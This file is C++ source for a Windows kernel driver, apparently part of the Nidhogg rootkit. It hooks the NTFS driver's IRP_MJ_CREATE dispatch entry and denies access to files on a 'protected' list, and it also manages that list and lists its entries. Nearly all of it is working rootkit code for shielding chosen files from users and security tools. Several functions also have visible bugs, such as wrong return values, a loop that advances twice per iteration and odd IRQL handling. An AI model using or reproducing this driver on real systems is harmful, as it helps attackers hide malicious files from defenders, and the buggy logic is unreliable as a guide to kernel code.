#include "pch.h"
#include "FileUtils.h"

_IRQL_requires_max_(APC_LEVEL)
FileHandler::FileHandler() {
	this->protectedFiles.Count = 0;
	protectedFiles.Items = AllocateMemory<PLIST_ENTRY>(sizeof(LIST_ENTRY));

	if (!this->protectedFiles.Items)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	InitializeListHead(this->protectedFiles.Items);
	this->protectedFiles.Lock.Init();
	memset(this->Callbacks, 0, sizeof(this->Callbacks));
}

_IRQL_requires_max_(APC_LEVEL)
FileHandler::~FileHandler() {

	// Uninstalling NTFS hooks if there are any.
	for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++) {
		if (this->Callbacks[i].Activated) {
			UninstallNtfsHook(i);
		}
	}

	ClearFilesList(FileType::All);
	FreeVirtualMemory(this->protectedFiles.Items);
}

_IRQL_requires_max_(APC_LEVEL)
PVOID FileHandler::GetNtfsCallback(_In_ ULONG index) const {
	if (index >= SUPPORTED_HOOKED_NTFS_CALLBACKS)
		ExRaiseStatus(STATUS_INVALID_PARAMETER);
	return this->Callbacks[index].Address;
}

/*
* Description:
* HookedNtfsIrpCreate is responsible for handling the NTFS IRP_MJ_CREATE.
*
* Parameters:
* @DeviceObject [_Inout_ PDEVICE_OBJECT] -- Unused.
* @Irp			[_Inout_ PIRP]			 -- Received IRP.
*
* Returns:
* @status		[NTSTATUS]		 -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS HookedNtfsIrpCreate(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	UNICODE_STRING fullPath = {0};
	KIRQL lockIrql = 0;
	KIRQL prevIrql = 0;
	tNtfsIrpFunction originalFunction = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	// If we reach here, it means something went horribly wrong.
	__try {
		originalFunction = static_cast<tNtfsIrpFunction>(NidhoggFileHandler->GetNtfsCallback(IRP_MJ_CREATE));
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return STATUS_SUCCESS;
	}

	do {
		// Validating the file object.
		if (!stack || !stack->FileObject)
			break;

		if (stack->FileObject->FileName.Length == 0 || !stack->FileObject->FileName.Buffer)
			break;

		// Validating the address of the file name.
		status = ProbeAddress(stack->FileObject->FileName.Buffer, stack->FileObject->FileName.Length,
			sizeof(WCHAR*), STATUS_NOT_FOUND);

		if (!NT_SUCCESS(status))
			break;

		// Acquiring the lock to prevent accessing to the file from other drivers.
		KeAcquireSpinLock(&stack->FileObject->IrpListLock, &prevIrql);
		KeLowerIrql(lockIrql);

		status = CopyUnicodeString(PsGetCurrentProcess(), &stack->FileObject->FileName, PsGetCurrentProcess(), &fullPath, 
			KernelMode);

		if (!NT_SUCCESS(status) || !fullPath.Buffer)
			break;

		KeRaiseIrql(DISPATCH_LEVEL, &prevIrql);
		KeReleaseSpinLock(&stack->FileObject->IrpListLock, prevIrql);
		KeLowerIrql(prevIrql);

		if (NidhoggFileHandler->FindFile(fullPath.Buffer, FileType::Protected)) {
			FreeVirtualMemory(fullPath.Buffer);
			Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
			return STATUS_SUCCESS;
		}
	} while (false);
	FreeVirtualMemory(fullPath.Buffer);

	return originalFunction(DeviceObject, Irp);
}

/*
* Description:
* InstallNtfsHook is responsible for applying NTFS hooks of given IRP.
*
* Parameters:
* @irpMjFunction [_In_ ULONG] -- IRP function.
*
* Returns:
* @status		 [NTSTATUS]	  -- Whether hooked or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS FileHandler::InstallNtfsHook(_In_ ULONG irpMjFunction) {
	UNICODE_STRING ntfsName;
	PDRIVER_OBJECT ntfsDriverObject = nullptr;
	LONG64 functionAddress = 0;
	NTSTATUS status = STATUS_SUCCESS;

	RtlInitUnicodeString(&ntfsName, NTFS_DRIVER_PATH);
	status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, 
		reinterpret_cast<PVOID*>(&ntfsDriverObject));

	if (!NT_SUCCESS(status))
		return status;

	switch (irpMjFunction) {
		case IRP_MJ_CREATE: {
			functionAddress = reinterpret_cast<LONG64>(HookedNtfsIrpCreate);
			break;
		}
		default:
			status = STATUS_NOT_SUPPORTED;
	}
	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(ntfsDriverObject);
		return status;
	}

	this->Callbacks[irpMjFunction].Address = reinterpret_cast<PVOID>(InterlockedExchange64(
		reinterpret_cast<LONG64*>(&ntfsDriverObject->MajorFunction[irpMjFunction]),
		functionAddress));
	this->Callbacks[irpMjFunction].Activated = true;

	ObDereferenceObject(ntfsDriverObject);
	return status;
}

/*
* Description:
* UninstallNtfsHook is responsible for removing NTFS hooks of given IRP.
*
* Parameters:
* @irpMjFunction [_In_ ULONG] -- IRP function.
*
* Returns:
* @status		 [NTSTATUS]   -- Whether removed or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS FileHandler::UninstallNtfsHook(_In_ ULONG irpMjFunction) {
	UNICODE_STRING ntfsName;
	PDRIVER_OBJECT ntfsDriverObject = NULL;
	LONG64 functionAddress = 0;
	NTSTATUS status = STATUS_SUCCESS;

	RtlInitUnicodeString(&ntfsName, NTFS_DRIVER_PATH);

	status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, 
		reinterpret_cast<PVOID*>(&ntfsDriverObject));

	if (!NT_SUCCESS(status))
		return status;

	switch (irpMjFunction) {
		case IRP_MJ_CREATE: {
			functionAddress = reinterpret_cast<LONG64>(this->Callbacks[IRP_MJ_CREATE].Address);
			break;
		}
		default:
			status = STATUS_NOT_SUPPORTED;
	}

	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(ntfsDriverObject);
		return status;
	}
	InterlockedExchange64(reinterpret_cast<LONG64*>(&ntfsDriverObject->MajorFunction[irpMjFunction]), functionAddress);
	this->Callbacks[irpMjFunction].Address = nullptr;
	this->Callbacks[irpMjFunction].Activated = false;

	ObDereferenceObject(ntfsDriverObject);
	return status;
}


/*
* Description:
* FindFile is responsible for searching if a file exists in the protected files list.
*
* Parameters:
* @path   [_In_ WCHAR*]   -- File's path.
* @type   [_In_ FileType] -- Type of file to search (Protected or Hidden).
*
* Returns:
* @bool					  -- Whether the file was found or not.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
bool FileHandler::FindFile(_In_ WCHAR* path, _In_ FileType type) const {
	if (!IsValidPath(path))
		return false;

	switch (type) {
	case FileType::Protected: {
		auto finder = [](_In_ const FileItem* entry, _In_ wchar_t* path) -> bool {
			return _wcsicmp(entry->FilePath, path) == 0;
		};

		return FindListEntry<FilesList, FileItem, wchar_t*>(
			this->protectedFiles, path, finder
		);
		break;
	}
	default:
		return false;
	}
	return false;
}

/*
* Description:
* AddFile is responsible for adding a file to the protected files list.
*
* Parameters:
* @path   [_In_ WCHAR*] -- File's path.
*
* Returns:
* @bool					-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool FileHandler::ProtectFile(_In_ WCHAR* path) {
	if (!IsValidPath(path) || !IsFileExists(path))
		return false;

	if (FindFile(path, FileType::Protected))
		return false;
	FileItem* newEntry = AllocateMemory<FileItem*>(sizeof(FileItem));

	if (!newEntry)
		return false;
	errno_t err = wcscpy_s(newEntry->FilePath, path);
	
	if (err != 0) {
		FreeVirtualMemory(newEntry);
		return false;
	}
	AddEntry<FilesList, FileItem>(protectedFiles, newEntry);
	return false;
}

/*
* Description:
* RemoveFile is responsible for removing a file from the protected files list.
*
* Parameters:
* @path   [_In_ WCHAR*]   -- File's path.
* @type   [_In_ FileType] -- Type of file to remove (Protected or Hidden).
*
* Returns:
* @bool					  -- Whether successfully removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool FileHandler::RemoveFile(_In_ WCHAR* path, _In_ FileType type) {
	if (!IsValidPath(path))
		return false;

	switch (type) {
	case FileType::Protected: {
		auto finder = [](_In_ const FileItem* item, _In_ wchar_t* path) {
			return _wcsicmp(item->FilePath, path) == 0;
		};
		FileItem* entry = FindListEntry<FilesList, FileItem, WCHAR*>(protectedFiles, path, finder);
		return RemoveListEntry<FilesList, FileItem>(protectedFiles, entry);
	}
	default:
		return false;
	}
}

/*
* Description:
* ClearFilesList is responsible for clearing the protected files list.
*
* Parameters:
* @type   [_In_ FileType] -- Type of files to clear.
*
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
void FileHandler::ClearFilesList(_In_ FileType type) {
	switch (type) {
		case FileType::Protected:
			ClearList<FilesList, FileItem>(this->protectedFiles);
			break;
		case FileType::All:
			ClearList<FilesList, FileItem>(this->protectedFiles);
			break;
	}
}

/*
* Description:
* QueryFiles is responsible for getting a protected file.
*
* Parameters:
* @item   [FileItem*] -- Protected file to get.
*
* Returns:
* @status [NTSTATUS]  -- Whether successfully copied or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS FileHandler::ListProtectedFiles(_Inout_ IoctlFileList* filesList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;
	NTSTATUS status = STATUS_SUCCESS;

	AutoLock locker(protectedFiles.Lock);

	if (protectedFiles.Count == 0) {
		filesList->Count = 0;
		return true;
	}
	if (filesList->Count == 0) {
		filesList->Count = protectedFiles.Count;
		return true;
	}
	currentEntry = protectedFiles.Items;

	while (currentEntry->Flink != protectedFiles.Items && count < filesList->Count) {
		currentEntry = currentEntry->Flink;
		FileItem* item = CONTAINING_RECORD(currentEntry, FileItem, Entry);

		if (item) {
			status = WriteProcessMemory(
				&item->FilePath,
				PsGetCurrentProcess(),
				filesList->Files + count,
				wcslen(item->FilePath) * sizeof(WCHAR),
				UserMode);

			if (!NT_SUCCESS(status)) {
				filesList->Count = count;
				return false;
			}
		}
		count++;
		currentEntry = currentEntry->Flink;
	}

	filesList->Count = count;
	return true;
}
